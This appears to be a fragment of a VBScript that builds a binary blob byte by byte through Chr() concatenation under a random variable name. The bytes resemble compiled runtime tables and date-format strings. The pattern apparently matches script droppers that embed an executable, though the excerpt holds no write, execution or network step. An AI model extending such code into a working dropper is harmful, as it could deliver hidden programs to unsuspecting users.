ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(40)&Chr(0)&Chr(40)&Chr(0)&Chr(40)&Chr(0)&Chr(40)&Chr(0)&Chr(40)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)
ySXd=ySXd&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(72)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(129)&Chr(0)&Chr(129)&Chr(0)&Chr(129)&Chr(0)&Chr(129)&Chr(0)&Chr(129)&Chr(0)
ySXd=ySXd&Chr(129)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(130)&Chr(0)&Chr(130)&Chr(0)&Chr(130)&Chr(0)&Chr(130)&Chr(0)&Chr(130)&Chr(0)&Chr(130)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)
ySXd=ySXd&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(104)&Chr(0)&Chr(40)&Chr(0)&Chr(40)&Chr(0)&Chr(40)&Chr(0)
ySXd=ySXd&Chr(40)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(72)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)
ySXd=ySXd&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(129)&Chr(1)&Chr(129)&Chr(1)&Chr(129)&Chr(1)&Chr(129)&Chr(1)&Chr(129)&Chr(1)&Chr(129)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(130)&Chr(1)&Chr(130)&Chr(1)&Chr(130)&Chr(1)&Chr(130)&Chr(1)&Chr(130)&Chr(1)&Chr(130)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)
ySXd=ySXd&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(72)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)
ySXd=ySXd&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(20)&Chr(0)&Chr(20)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(20)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)
ySXd=ySXd&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(16)&Chr(0)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(16)&Chr(0)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(129)&Chr(130)&Chr(131)&Chr(132)&Chr(133)&Chr(134)&Chr(135)
ySXd=ySXd&Chr(136)&Chr(137)&Chr(138)&Chr(139)&Chr(140)&Chr(141)&Chr(142)&Chr(143)&Chr(144)&Chr(145)&Chr(146)&Chr(147)&Chr(148)&Chr(149)&Chr(150)&Chr(151)&Chr(152)&Chr(153)&Chr(154)&Chr(155)&Chr(156)&Chr(157)&Chr(158)&Chr(159)&Chr(160)&Chr(161)&Chr(162)&Chr(163)&Chr(164)&Chr(165)&Chr(166)&Chr(167)&Chr(168)&Chr(169)&Chr(170)&Chr(171)&Chr(172)&Chr(173)&Chr(174)&Chr(175)&Chr(176)&Chr(177)&Chr(178)&Chr(179)&Chr(180)&Chr(181)&Chr(182)&Chr(183)&Chr(184)&Chr(185)&Chr(186)&Chr(187)&Chr(188)&Chr(189)&Chr(190)&Chr(191)&Chr(192)&Chr(193)&Chr(194)&Chr(195)&Chr(196)&Chr(197)&Chr(198)&Chr(199)&Chr(200)&Chr(201)&Chr(202)&Chr(203)&Chr(204)&Chr(205)&Chr(206)&Chr(207)&Chr(208)&Chr(209)&Chr(210)&Chr(211)&Chr(212)&Chr(213)&Chr(214)&Chr(215)&Chr(216)&Chr(217)&Chr(218)&Chr(219)&Chr(220)&Chr(221)&Chr(222)&Chr(223)&Chr(224)&Chr(225)&Chr(226)&Chr(227)&Chr(228)&Chr(229)&Chr(230)&Chr(231)&Chr(232)&Chr(233)&Chr(234)&Chr(235)
ySXd=ySXd&Chr(236)&Chr(237)&Chr(238)&Chr(239)&Chr(240)&Chr(241)&Chr(242)&Chr(243)&Chr(244)&Chr(245)&Chr(246)&Chr(247)&Chr(248)&Chr(249)&Chr(250)&Chr(251)&Chr(252)&Chr(253)&Chr(254)&Chr(255)&Chr(0)&Chr(1)&Chr(2)&Chr(3)&Chr(4)&Chr(5)&Chr(6)&Chr(7)&Chr(8)&Chr(9)&Chr(10)&Chr(11)&Chr(12)&Chr(13)&Chr(14)&Chr(15)&Chr(16)&Chr(17)&Chr(18)&Chr(19)&Chr(20)&Chr(21)&Chr(22)&Chr(23)&Chr(24)&Chr(25)&Chr(26)&Chr(27)&Chr(28)&Chr(29)&Chr(30)&Chr(31)&Chr(32)&Chr(33)&Chr(34)&Chr(35)&Chr(36)&Chr(37)&Chr(38)&Chr(39)&Chr(40)&Chr(41)&Chr(42)&Chr(43)&Chr(44)&Chr(45)&Chr(46)&Chr(47)&Chr(48)&Chr(49)&Chr(50)&Chr(51)&Chr(52)&Chr(53)&Chr(54)&Chr(55)&Chr(56)&Chr(57)&Chr(58)&Chr(59)&Chr(60)&Chr(61)&Chr(62)&Chr(63)&Chr(64)&Chr(97)&Chr(98)&Chr(99)&Chr(100)&Chr(101)&Chr(102)&Chr(103)&Chr(104)&Chr(105)&Chr(106)&Chr(107)&Chr(108)&Chr(109)&Chr(110)&Chr(111)
ySXd=ySXd&Chr(112)&Chr(113)&Chr(114)&Chr(115)&Chr(116)&Chr(117)&Chr(118)&Chr(119)&Chr(120)&Chr(121)&Chr(122)&Chr(91)&Chr(92)&Chr(93)&Chr(94)&Chr(95)&Chr(96)&Chr(97)&Chr(98)&Chr(99)&Chr(100)&Chr(101)&Chr(102)&Chr(103)&Chr(104)&Chr(105)&Chr(106)&Chr(107)&Chr(108)&Chr(109)&Chr(110)&Chr(111)&Chr(112)&Chr(113)&Chr(114)&Chr(115)&Chr(116)&Chr(117)&Chr(118)&Chr(119)&Chr(120)&Chr(121)&Chr(122)&Chr(123)&Chr(124)&Chr(125)&Chr(126)&Chr(127)&Chr(128)&Chr(129)&Chr(130)&Chr(131)&Chr(132)&Chr(133)&Chr(134)&Chr(135)&Chr(136)&Chr(137)&Chr(138)&Chr(139)&Chr(140)&Chr(141)&Chr(142)&Chr(143)&Chr(144)&Chr(145)&Chr(146)&Chr(147)&Chr(148)&Chr(149)&Chr(150)&Chr(151)&Chr(152)&Chr(153)&Chr(154)&Chr(155)&Chr(156)&Chr(157)&Chr(158)&Chr(159)&Chr(160)&Chr(161)&Chr(162)&Chr(163)&Chr(164)&Chr(165)&Chr(166)&Chr(167)&Chr(168)&Chr(169)&Chr(170)&Chr(171)&Chr(172)&Chr(173)&Chr(174)&Chr(175)&Chr(176)&Chr(177)&Chr(178)&Chr(179)
ySXd=ySXd&Chr(180)&Chr(181)&Chr(182)&Chr(183)&Chr(184)&Chr(185)&Chr(186)&Chr(187)&Chr(188)&Chr(189)&Chr(190)&Chr(191)&Chr(192)&Chr(193)&Chr(194)&Chr(195)&Chr(196)&Chr(197)&Chr(198)&Chr(199)&Chr(200)&Chr(201)&Chr(202)&Chr(203)&Chr(204)&Chr(205)&Chr(206)&Chr(207)&Chr(208)&Chr(209)&Chr(210)&Chr(211)&Chr(212)&Chr(213)&Chr(214)&Chr(215)&Chr(216)&Chr(217)&Chr(218)&Chr(219)&Chr(220)&Chr(221)&Chr(222)&Chr(223)&Chr(224)&Chr(225)&Chr(226)&Chr(227)&Chr(228)&Chr(229)&Chr(230)&Chr(231)&Chr(232)&Chr(233)&Chr(234)&Chr(235)&Chr(236)&Chr(237)&Chr(238)&Chr(239)&Chr(240)&Chr(241)&Chr(242)&Chr(243)&Chr(244)&Chr(245)&Chr(246)&Chr(247)&Chr(248)&Chr(249)&Chr(250)&Chr(251)&Chr(252)&Chr(253)&Chr(254)&Chr(255)&Chr(128)&Chr(129)&Chr(130)&Chr(131)&Chr(132)&Chr(133)&Chr(134)&Chr(135)&Chr(136)&Chr(137)&Chr(138)&Chr(139)&Chr(140)&Chr(141)&Chr(142)&Chr(143)&Chr(144)&Chr(145)&Chr(146)&Chr(147)&Chr(148)&Chr(149)&Chr(150)&Chr(151)
ySXd=ySXd&Chr(152)&Chr(153)&Chr(154)&Chr(155)&Chr(156)&Chr(157)&Chr(158)&Chr(159)&Chr(160)&Chr(161)&Chr(162)&Chr(163)&Chr(164)&Chr(165)&Chr(166)&Chr(167)&Chr(168)&Chr(169)&Chr(170)&Chr(171)&Chr(172)&Chr(173)&Chr(174)&Chr(175)&Chr(176)&Chr(177)&Chr(178)&Chr(179)&Chr(180)&Chr(181)&Chr(182)&Chr(183)&Chr(184)&Chr(185)&Chr(186)&Chr(187)&Chr(188)&Chr(189)&Chr(190)&Chr(191)&Chr(192)&Chr(193)&Chr(194)&Chr(195)&Chr(196)&Chr(197)&Chr(198)&Chr(199)&Chr(200)&Chr(201)&Chr(202)&Chr(203)&Chr(204)&Chr(205)&Chr(206)&Chr(207)&Chr(208)&Chr(209)&Chr(210)&Chr(211)&Chr(212)&Chr(213)&Chr(214)&Chr(215)&Chr(216)&Chr(217)&Chr(218)&Chr(219)&Chr(220)&Chr(221)&Chr(222)&Chr(223)&Chr(224)&Chr(225)&Chr(226)&Chr(227)&Chr(228)&Chr(229)&Chr(230)&Chr(231)&Chr(232)&Chr(233)&Chr(234)&Chr(235)&Chr(236)&Chr(237)&Chr(238)&Chr(239)&Chr(240)&Chr(241)&Chr(242)&Chr(243)&Chr(244)&Chr(245)&Chr(246)&Chr(247)&Chr(248)&Chr(249)&Chr(250)&Chr(251)
ySXd=ySXd&Chr(252)&Chr(253)&Chr(254)&Chr(255)&Chr(0)&Chr(1)&Chr(2)&Chr(3)&Chr(4)&Chr(5)&Chr(6)&Chr(7)&Chr(8)&Chr(9)&Chr(10)&Chr(11)&Chr(12)&Chr(13)&Chr(14)&Chr(15)&Chr(16)&Chr(17)&Chr(18)&Chr(19)&Chr(20)&Chr(21)&Chr(22)&Chr(23)&Chr(24)&Chr(25)&Chr(26)&Chr(27)&Chr(28)&Chr(29)&Chr(30)&Chr(31)&Chr(32)&Chr(33)&Chr(34)&Chr(35)&Chr(36)&Chr(37)&Chr(38)&Chr(39)&Chr(40)&Chr(41)&Chr(42)&Chr(43)&Chr(44)&Chr(45)&Chr(46)&Chr(47)&Chr(48)&Chr(49)&Chr(50)&Chr(51)&Chr(52)&Chr(53)&Chr(54)&Chr(55)&Chr(56)&Chr(57)&Chr(58)&Chr(59)&Chr(60)&Chr(61)&Chr(62)&Chr(63)&Chr(64)&Chr(65)&Chr(66)&Chr(67)&Chr(68)&Chr(69)&Chr(70)&Chr(71)&Chr(72)&Chr(73)&Chr(74)&Chr(75)&Chr(76)&Chr(77)&Chr(78)&Chr(79)&Chr(80)&Chr(81)&Chr(82)&Chr(83)&Chr(84)&Chr(85)&Chr(86)&Chr(87)&Chr(88)&Chr(89)&Chr(90)&Chr(91)&Chr(92)&Chr(93)&Chr(94)&Chr(95)
ySXd=ySXd&Chr(96)&Chr(65)&Chr(66)&Chr(67)&Chr(68)&Chr(69)&Chr(70)&Chr(71)&Chr(72)&Chr(73)&Chr(74)&Chr(75)&Chr(76)&Chr(77)&Chr(78)&Chr(79)&Chr(80)&Chr(81)&Chr(82)&Chr(83)&Chr(84)&Chr(85)&Chr(86)&Chr(87)&Chr(88)&Chr(89)&Chr(90)&Chr(123)&Chr(124)&Chr(125)&Chr(126)&Chr(127)&Chr(128)&Chr(129)&Chr(130)&Chr(131)&Chr(132)&Chr(133)&Chr(134)&Chr(135)&Chr(136)&Chr(137)&Chr(138)&Chr(139)&Chr(140)&Chr(141)&Chr(142)&Chr(143)&Chr(144)&Chr(145)&Chr(146)&Chr(147)&Chr(148)&Chr(149)&Chr(150)&Chr(151)&Chr(152)&Chr(153)&Chr(154)&Chr(155)&Chr(156)&Chr(157)&Chr(158)&Chr(159)&Chr(160)&Chr(161)&Chr(162)&Chr(163)&Chr(164)&Chr(165)&Chr(166)&Chr(167)&Chr(168)&Chr(169)&Chr(170)&Chr(171)&Chr(172)&Chr(173)&Chr(174)&Chr(175)&Chr(176)&Chr(177)&Chr(178)&Chr(179)&Chr(180)&Chr(181)&Chr(182)&Chr(183)&Chr(184)&Chr(185)&Chr(186)&Chr(187)&Chr(188)&Chr(189)&Chr(190)&Chr(191)&Chr(192)&Chr(193)&Chr(194)&Chr(195)
ySXd=ySXd&Chr(196)&Chr(197)&Chr(198)&Chr(199)&Chr(200)&Chr(201)&Chr(202)&Chr(203)&Chr(204)&Chr(205)&Chr(206)&Chr(207)&Chr(208)&Chr(209)&Chr(210)&Chr(211)&Chr(212)&Chr(213)&Chr(214)&Chr(215)&Chr(216)&Chr(217)&Chr(218)&Chr(219)&Chr(220)&Chr(221)&Chr(222)&Chr(223)&Chr(224)&Chr(225)&Chr(226)&Chr(227)&Chr(228)&Chr(229)&Chr(230)&Chr(231)&Chr(232)&Chr(233)&Chr(234)&Chr(235)&Chr(236)&Chr(237)&Chr(238)&Chr(239)&Chr(240)&Chr(241)&Chr(242)&Chr(243)&Chr(244)&Chr(245)&Chr(246)&Chr(247)&Chr(248)&Chr(249)&Chr(250)&Chr(251)&Chr(252)&Chr(253)&Chr(254)&Chr(255)&Chr(72)&Chr(72)&Chr(58)&Chr(109)&Chr(109)&Chr(58)&Chr(115)&Chr(115)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(100)&Chr(100)&Chr(100)&Chr(100)&Chr(44)&Chr(32)&Chr(77)&Chr(77)&Chr(77)&Chr(77)&Chr(32)&Chr(100)&Chr(100)&Chr(44)&Chr(32)&Chr(121)&Chr(121)&Chr(121)&Chr(121)&Chr(0)&Chr(77)&Chr(77)&Chr(47)&Chr(100)&Chr(100)&Chr(47)&Chr(121)&Chr(121)
